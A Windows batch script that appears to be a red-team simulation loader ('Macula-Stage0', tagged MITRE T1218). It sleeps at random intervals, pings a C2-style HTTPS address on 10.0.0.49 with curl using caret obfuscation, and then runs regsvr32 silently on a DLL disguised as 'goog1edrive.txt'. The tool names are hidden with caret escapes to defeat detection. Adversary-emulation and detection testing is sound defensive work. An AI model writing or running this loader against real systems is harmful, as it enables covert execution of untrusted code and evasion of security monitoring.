@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET zqdnhm=%APPDATA%\7706\78c21fba
SET kfgjc=Macula-Stage0-7706
SET xwbvhjr=https://10.0.0.49
SET hmjpw=https://10.0.0.49/stage/2/icon.png?7706-10
SET vtqnm=BALAM-S2BO
SET fspqnrk=10
SET zntghy=goog1edrive.txt
SET wqmdmn=7706
SET mljpx=1

REM Build paths with PHR_ values
SET llogpath=%APPDATA%\!fspqnrk!\macula-simulations.log
SET ltempdir=%APPDATA%\!fspqnrk!

REM Initial delay 30-60s
SET /A udelay=30 + !RANDOM! %% 31
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: SLEEP_START=!udelay! seconds>> "!llogpath!" 2>nul)
timeout /t !udelay! /nobreak >nul
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: SLEEP_RESULT=done>> "!llogpath!" 2>nul)

REM Obfuscate LOLBIN using caret escapes
SET mtmp1=r^e^g^s
SET mtmp2=v^r
SET mtmp3=3^2
SET xlolbin=%WINDIR%\System32\!mtmp1!!mtmp2!!mtmp3!^.e^x^e

REM TTP logging setup
SET jttp=T1218
SET jttpname=Signed Binary Proxy Execution

REM Check server availability (heartbeat)
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: HEARTBEAT_START=!hmjpw!>> "!llogpath!" 2>nul)
SET wcmd1=c^u^r^l^.^e^
SET wcmd2=x^e
!wcmd1!!wcmd2! -k -s -o nul "!hmjpw!"
SET jres=!ERRORLEVEL!
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: HEARTBEAT_RESULT=errorlevel=!jres!>> "!llogpath!" 2>nul)

REM Delay before next operation
SET /A vdelay=5 + !RANDOM! %% 11
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: SLEEP_START=!vdelay! seconds>> "!llogpath!" 2>nul)
ping -n !vdelay! 127.0.0.1 >nul
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: SLEEP_RESULT=done>> "!llogpath!" 2>nul)

REM Change to output directory
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: CHDIR_START=!zqdnhm!>> "!llogpath!" 2>nul)
cd /d "!zqdnhm!" 2>nul
SET jcdres=!ERRORLEVEL!
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: CHDIR_RESULT=errorlevel=!jcdres!>> "!llogpath!" 2>nul)

REM Random delay before execution
SET /A rdelay=!RANDOM! %% 20 + 10
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: SLEEP_START=!rdelay! seconds>> "!llogpath!" 2>nul)
CHOICE /C Y /N /D Y /T !rdelay! >nul
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: SLEEP_RESULT=done>> "!llogpath!" 2>nul)

REM Execute DLL with obfuscated command
SET xcmd1=/^s^
SET xcmd2="!zntghy!"
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: PROCESS_START=!xlolbin! !xcmd1!!xcmd2!>> "!llogpath!" 2>nul)

SET jexecres=
SET jerr=
FOR /F "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do SET jdatetime=%%I
IF NOT "!jdatetime!"=="" (
    SET jts=!jdatetime:~0,4!-!jdatetime:~4,2!-!jdatetime:~6,2! !jdatetime:~8,2!:!jdatetime:~10,2!:!jdatetime:~12,2!.!jdatetime:~15,3!
) ELSE (
    SET jts=!DATE! !TIME!
)

!xlolbin! !xcmd1!!xcmd2!
IF !ERRORLEVEL! EQU 0 (
    SET jexecres=1
    SET jerr=
) ELSE (
    SET jexecres=0
    SET jerr=load_failed
)

echo [!jts!][!vtqnm!]: !fspqnrk!-!wqmdmn!-!jttp!|!jttpname!=!jexecres!:!jerr!>> "!llogpath!" 2>nul || (
    REM Silently suppress logging failure
    >nul 2>&1
)

if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: PROCESS_RESULT=errorlevel=!ERRORLEVEL!>> "!llogpath!" 2>nul)

REM Final delay
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: SLEEP_START=15 seconds>> "!llogpath!" 2>nul)
timeout /t 15 /nobreak >nul
if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: SLEEP_RESULT=done>> "!llogpath!" 2>nul)

if "!mljpx!"=="1" (echo [!DATE! !TIME!][DEBUG][!vtqnm!]: SCRIPT_END=exit_code=!ERRORLEVEL!>> "!llogpath!" 2>nul)
ENDLOCAL